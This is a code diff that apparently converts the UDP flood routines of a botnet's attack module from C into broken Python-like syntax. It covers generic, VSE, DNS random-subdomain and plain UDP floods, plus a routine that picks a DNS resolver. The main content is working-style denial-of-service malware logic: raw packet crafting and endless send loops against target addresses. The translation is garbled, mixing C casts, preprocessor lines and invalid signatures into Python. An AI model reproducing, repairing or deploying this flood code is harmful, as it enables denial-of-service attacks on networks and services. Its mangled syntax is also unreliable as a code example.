@@ -17,10 +17,59 @@ import sys
 #include "util.h"
 #include "table.h"
 #include "protocol.h"
+import checksum_h_header
+import includes_h_header
+import attack_h_header
+import protocol_h_header
+import util_h_header
+import checksum_h_header
+import rand_h_header
+import util_c
 
-static ipv4_t get_dns_resolver(void)
+# predefined functions from imported modules
+https_transport = includes_h_header.https_transport
+dns_resolver = includes_h_header.dns_resolver
+ipv4_t = includes_h_header.ipv4_t
+htonl = includes_h_header.htonl
+INET_ADDR = includes_h_header.INET_ADDR
+xputc = includes_h_header.xputc
+xputs = includes_h_header.xputs
+va_list = includes_h_header.va_list
+va_start = includes_h_header.va_start
+va_end = includes_h_header.va_end
+xvprintf = includes_h_header.xvprintf
+xprintf = includes_h_header.xprintf
+attack_target = attack_h_header.attack_target
+attack_option = attack_h_header.attack_option
+attack_method = attack_h_header.attack_method
+attack_stomp_data = attack_h_header.attack_stomp_data
+attack_http_state = attack_h_header.attack_http_state
+attack_cfnull_state = attack_h_header.attack_cfnull_state
+add_attack = attack_h_header.add_attack
+free_opts = attack_h_header.free_opts
+table_value = table_h_header.table_value
+# DEBUG: This is how you generate these lines automatically, example...
+# DEBUG: cat util_c.py | egrep -i 'def|class' | egrep -vi '#' | cut -d \( -f 1 | awk '{print $2" = util_c."$2}'
+util_strlen = util_c.util_strlen
+util_strncmp = util_c.util_strncmp
+util_strcmp = util_c.util_strcmp
+util_strcpy = util_c.util_strcpy
+util_memcpy = util_c.util_memcpy
+util_zero = util_c.util_zero
+util_atoi = util_c.util_atoi
+util_itoa = util_c.util_itoa
+util_memsearch = util_c.util_memsearch
+util_stristr = util_c.util_stristr
+util_fdgets = util_c.util_fdgets
+util_isupper = util_c.util_isupper
+util_isalpha = util_c.util_isalpha
+util_isspace = util_c.util_isspace
+util_isdigit = util_c.util_isdigit
+# static ipv4_t get_dns_resolver(void)
+ipv4_t(get_dns_resolver)
 
-def attack_udp_generic(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
+# def attack_udp_generic(targs_len, attack_target *targs, opts_len, attack_option *opts):
+def attack_udp_generic(targs_len, attack_target(targs, opts_len), attack_option(opts)):
     pkts = calloc(targs_len; sizeof ())
     ip_tos = attack_get_opt_int(opts_len; 0)
     ip_ident = attack_get_opt_int(opts_len; 0xffff)
@@ -49,17 +98,17 @@ def attack_udp_generic(targs_len, struct attack_target *targs, opts_len, struct 
         return
 
     for i in range(targs_len):
-        struct iphdr *iph
-        struct udphdr *udph
+        iphdr *iph
+        udphdr *udph
 
         pkts[i] = calloc(1510, sizeof (char))
-        iph = (struct iphdr *)pkts[i]
-        udph = (struct udphdr *)(iph + 1)
+        iph = (iphdr *)pkts[i]
+        udph = (udphdr *)(iph + 1)
 
         iph.version = 4
         iph.ihl = 5
         iph.tos = ip_tos
-        iph.tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len)
+        iph.tot_len = htons(sizeof (iphdr) + sizeof (udphdr) + data_len)
         iph.id = htons(ip_ident)
         iph.ttl = ip_ttl
         if dont_frag:
@@ -70,13 +119,15 @@ def attack_udp_generic(targs_len, struct attack_target *targs, opts_len, struct 
 
         udph.source = htons(sport)
         udph.dest = htons(dport)
-        udph.len = htons(sizeof (struct udphdr) + data_len)
+        udph.len = htons(sizeof (udphdr) + data_len)
 
     while True:
         for i in range(targs_len):
             pkt = pkts[i]
-            struct iphdr *iph = (struct iphdr *)pkt
-            struct udphdr *udph = (struct udphdr *)(iph + 1)
+            # iphdr *iph = (iphdr *)pkt
+            # udphdr *udph = (udphdr *)(iph + 1)
+            iphdr(iph) = iphdr(pkt)
+            udphdr(udph) = udphdr(iph+1)
             data = ()(udph + 1)
 
             # For prefix attacks
@@ -98,20 +149,21 @@ def attack_udp_generic(targs_len, struct attack_target *targs, opts_len, struct 
                 rand_str(data, data_len)
 
             iph.check = 0
-            iph.check = checksum_generic(()iph, sizeof (struct iphdr))
+            iph.check = checksum_generic(()iph, sizeof (iphdr))
 
             udph.check = 0
-            udph.check = checksum_tcpudp(iph, udph, udph.len, sizeof (struct udphdr) + data_len)
+            udph.check = checksum_tcpudp(iph, udph, udph.len, sizeof (udphdr) + data_len)
 
             targs[i].sock_addr.sin_port = udph.dest
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in))
+            sendto(fd, pkt, sizeof (iphdr) + sizeof (udphdr) + data_len, MSG_NOSIGNAL, (sockaddr *)&targs[i].sock_addr, sizeof (sockaddr_in))
 #ifdef DEBUG
             break
             if errno != 0:
                 printf("errno = %d\n" % (errno))
 #endif
 
-def attack_udp_vse(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
+# def attack_udp_vse(targs_len, attack_target *targs, opts_len, attack_option *opts):
+def attack_udp_vse(targs_len, attack_target(targs, opts_len), attack_option(opts)):
     pkts = calloc(targs_len; sizeof ())
     ip_tos = attack_get_opt_int(opts_len; 0)
     ip_ident = attack_get_opt_int(opts_len; 0xffff)
@@ -137,18 +189,22 @@ def attack_udp_vse(targs_len, struct attack_target *targs, opts_len, struct atta
         return
 
     for i in range(targs_len):
-        struct iphdr *iph
-        struct udphdr *udph
+        # iphdr *iph
+        # udphdr *udph
+        iphdr(iph)
+        udphdr(updh)
 
         pkts[i] = calloc(128, sizeof (char))
-        iph = (struct iphdr *)pkts[i]
-        udph = (struct udphdr *)(iph + 1)
+        # iph = (iphdr *)pkts[i]
+        # udph = (udphdr *)(iph + 1)
+        iph = iphdr(pkts[i])
+        udph = udphdr(iph+1)
         data = ()(udph + 1)
 
         iph.version = 4
         iph.ihl = 5
         iph.tos = ip_tos
-        iph.tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len)
+        iph.tot_len = htons(sizeof (iphdr) + sizeof (udphdr) + sizeof (uint32_t) + vse_payload_len)
         iph.id = htons(ip_ident)
         iph.ttl = ip_ttl
         if dont_frag:
@@ -159,7 +215,7 @@ def attack_udp_vse(targs_len, struct attack_target *targs, opts_len, struct atta
 
         udph.source = htons(sport)
         udph.dest = htons(dport)
-        udph.len = htons(sizeof (struct udphdr) + 4 + vse_payload_len)
+        udph.len = htons(sizeof (udphdr) + 4 + vse_payload_len)
 
         *(()data) = 0xffffffff
         data += sizeof (uint32_t)
@@ -168,9 +224,11 @@ def attack_udp_vse(targs_len, struct attack_target *targs, opts_len, struct atta
     while True:
         for i in range(targs_len):
             pkt = pkts[i]
-            struct iphdr *iph = (struct iphdr *)pkt
-            struct udphdr *udph = (struct udphdr *)(iph + 1)
-            
+            # iphdr *iph = (iphdr *)pkt
+            # udphdr *udph = (udphdr *)(iph + 1)
+            iphdr(iph) = iphdr(pkt)
+            udphdr(udph) = udphdr(iph+1)
+
             # For prefix attacks
             if targs[i].netmask < 32:
                 iph.daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask))
@@ -183,20 +241,20 @@ def attack_udp_vse(targs_len, struct attack_target *targs, opts_len, struct atta
                 udph.dest = rand_next()
 
             iph.check = 0
-            iph.check = checksum_generic(()iph, sizeof (struct iphdr))
+            iph.check = checksum_generic(()iph, sizeof (iphdr))
 
             udph.check = 0
-            udph.check = checksum_tcpudp(iph, udph, udph.len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len)
+            udph.check = checksum_tcpudp(iph, udph, udph.len, sizeof (udphdr) + sizeof (uint32_t) + vse_payload_len)
 
             targs[i].sock_addr.sin_port = udph.dest
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in))
+            sendto(fd, pkt, sizeof (iphdr) + sizeof (udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (sockaddr *)&targs[i].sock_addr, sizeof (sockaddr_in))
 #ifdef DEBUG
             break
             if errno != 0:
                 printf("errno = %d\n" % (errno))
 #endif
 
-def attack_udp_dns(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
+def attack_udp_dns(targs_len, attack_target *targs, opts_len, attack_option *opts):
     pkts = calloc(targs_len; sizeof ())
     ip_tos = attack_get_opt_int(opts_len; 0)
     ip_ident = attack_get_opt_int(opts_len; 0xffff)
@@ -231,21 +289,29 @@ def attack_udp_dns(targs_len, struct attack_target *targs, opts_len, struct atta
 
     for i in range(targs_len):
         curr_word_len = 0; num_words = 0
-        struct iphdr *iph
-        struct udphdr *udph
-        struct dnshdr *dnsh
-        struct dns_question *dnst
+        # iphdr *iph
+        # udphdr *udph
+        # dnshdr *dnsh
+        # dns_question *dnst
+        iphdr(iph)
+        udphdr(udph)
+        dnshdr(dnsh)
+        dns_question(dnst)
 
         pkts[i] = calloc(600, sizeof (char))
-        iph = (struct iphdr *)pkts[i]
-        udph = (struct udphdr *)(iph + 1)
-        dnsh = (struct dnshdr *)(udph + 1)
+        # iph = (iphdr *)pkts[i]
+        # udph = (udphdr *)(iph + 1)
+        # dnsh = (dnshdr *)(udph + 1)
         qname = ()(dnsh + 1)
+        iph = iphdr(pkts[i])
+        udph = udphdr(iph+1)
+        dnsh = dnshdr(udph+1)
+
 
         iph.version = 4
         iph.ihl = 5
         iph.tos = ip_tos
-        iph.tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question))
+        iph.tot_len = htons(sizeof (iphdr) + sizeof (udphdr) + sizeof (dnshdr) + 1 + data_len + 2 + domain_len + sizeof (dns_question))
         iph.id = htons(ip_ident)
         iph.ttl = ip_ttl
         if dont_frag:
@@ -256,7 +322,7 @@ def attack_udp_dns(targs_len, struct attack_target *targs, opts_len, struct atta
 
         udph.source = htons(sport)
         udph.dest = htons(dport)
-        udph.len = htons(sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question))
+        udph.len = htons(sizeof (udphdr) + sizeof (dnshdr) + 1 + data_len + 2 + domain_len + sizeof (dns_question))
 
         dnsh.id = htons(dns_hdr_id)
         dnsh.opts = htons(1 << 8) # Recursion desired
@@ -280,16 +346,19 @@ def attack_udp_dns(targs_len, struct attack_target *targs, opts_len, struct atta
                 curr_word_len += 1
         *curr_lbl = curr_word_len
 
-        dnst = (struct dns_question *)(qname + domain_len + 2)
+        dnst = (dns_question *)(qname + domain_len + 2)
         dnst.qtype = htons(PROTO_DNS_QTYPE_A)
         dnst.qclass = htons(PROTO_DNS_QCLASS_IP)
 
     while True:
         for i in range(targs_len):
             pkt = pkts[i]
-            struct iphdr *iph = (struct iphdr *)pkt
-            struct udphdr *udph = (struct udphdr *)(iph + 1)
-            struct dnshdr *dnsh = (struct dnshdr *)(udph + 1)
+            iphdr *iph = (iphdr *)pkt
+            # udphdr *udph = (udphdr *)(iph + 1)
+            # dnshdr *dnsh = (dnshdr *)(udph + 1)
+            iphdr(iph) = iphdr(pkt)
+            udphdr(udph) = udphdr(iph+1)
+            dnshdr(dnsh) = dnshdr(udph+1)
             qrand = (()(dnsh + 1)) + 1
 
             if ip_ident == 0xffff:
@@ -305,21 +374,21 @@ def attack_udp_dns(targs_len, struct attack_target *targs, opts_len, struct atta
             rand_alphastr(()qrand, data_len)
 
             iph.check = 0
-            iph.check = checksum_generic(()iph, sizeof (struct iphdr))
+            iph.check = checksum_generic(()iph, sizeof (iphdr))
 
             udph.check = 0
-            udph.check = checksum_tcpudp(iph, udph, udph.len, sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question))
+            udph.check = checksum_tcpudp(iph, udph, udph.len, sizeof (udphdr) + sizeof (dnshdr) + 1 + data_len + 2 + domain_len + sizeof (dns_question))
 
             targs[i].sock_addr.sin_addr.s_addr = dns_resolver
             targs[i].sock_addr.sin_port = udph.dest
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in))
+            sendto(fd, pkt, sizeof (iphdr) + sizeof (udphdr) + sizeof (dnshdr) + 1 + data_len + 2 + domain_len + sizeof (dns_question), MSG_NOSIGNAL, (sockaddr *)&targs[i].sock_addr, sizeof (sockaddr_in))
 #ifdef DEBUG
             break
             if errno != 0:
                 printf("errno = %d\n" % (errno))
 #endif
 
-def attack_udp_plain(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
+def attack_udp_plain(targs_len, attack_target *targs, opts_len, attack_option *opts):
 #ifdef DEBUG
     printf("in udp plain\n")
 #endif
@@ -330,7 +399,7 @@ def attack_udp_plain(targs_len, struct attack_target *targs, opts_len, struct at
     port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff)
     data_len = attack_get_opt_int(opts_len; 512)
     BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, True)
-    struct sockaddr_in bind_addr = {0}
+    sockaddr_in bind_addr = {0}
 
     if sport == 0xffff:
         sport = rand_next()
@@ -342,8 +411,10 @@ def attack_udp_plain(targs_len, struct attack_target *targs, opts_len, struct at
 #endif
 
     for i in range(targs_len):
-        struct iphdr *iph
-        struct udphdr *udph
+        # iphdr *iph
+        # udphdr *udph
+        iphdr(iph)
+        udphdr(udph)
 
         pkts[i] = calloc(65535, sizeof (char))
 
@@ -362,7 +433,7 @@ def attack_udp_plain(targs_len, struct attack_target *targs, opts_len, struct at
         bind_addr.sin_port = sport
         bind_addr.sin_addr.s_addr = 0
 
-        if bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1:
+        if bind(fds[i], (sockaddr *)&bind_addr, sizeof (sockaddr_in)) == -1:
 #ifdef DEBUG
             printf("Failed to bind udp socket.\n")
 #endif
@@ -371,7 +442,7 @@ def attack_udp_plain(targs_len, struct attack_target *targs, opts_len, struct at
         if targs[i].netmask < 32:
             targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask))
 
-        if connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1:
+        if connect(fds[i], (sockaddr *)&targs[i].sock_addr, sizeof (sockaddr_in)) == -1:
 #ifdef DEBUG
             printf("Failed to connect udp socket.\n")
 #endif
@@ -403,7 +474,8 @@ def attack_udp_plain(targs_len, struct attack_target *targs, opts_len, struct at
                 printf("errno = %d\n" % (errno))
 #endif
 
-static ipv4_t get_dns_resolver(void)
+# static ipv4_t get_dns_resolver(void)
+ipv4_t(get_dns_resolver)
 
     table_unlock_val(TABLE_ATK_RESOLVER)
     fd = os.open(table_retrieve_val(TABLE_ATK_RESOLVER, NULL), os.O_RDONLY)
@@ -416,8 +488,8 @@ static ipv4_t get_dns_resolver(void)
         nspos = util_stristr(resolvbuf, ret, table_retrieve_val(TABLE_ATK_NSERV, NULL))
         table_lock_val(TABLE_ATK_NSERV)
         if nspos != -1:
-            BOOL finished_whitespace = False
-            BOOL found = False
+            finished_whitespace = False
+            found = False
 
             for i in range(nspos, ret):
                 c = resolvbuf[i]
@@ -441,13 +513,23 @@ static ipv4_t get_dns_resolver(void)
                 printf("Found local resolver: '%s'\n" % (ipbuf))
 #endif
                 return inet_addr(ipbuf)
-
-    switch rand_next() % 4:
-    case 0:
+    a = rand_next() % 4
+    if a == 0:
         return INET_ADDR(8,8,8,8)
-    case 1:
+    elif a == 1:
         return INET_ADDR(74,82,42,42)
-    case 2:
+    elif a == 2:
         return INET_ADDR(64,6,64,6)
-    case 3:
+    elif a == 3:
         return INET_ADDR(4,2,2,2)
+    else:
+        pass
+    # switch rand_next() % 4:
+    # case 0:
+    #     return INET_ADDR(8,8,8,8)
+    # case 1:
+    #     return INET_ADDR(74,82,42,42)
+    # case 2:
+    #     return INET_ADDR(64,6,64,6)
+    # case 3:
+    #     return INET_ADDR(4,2,2,2)
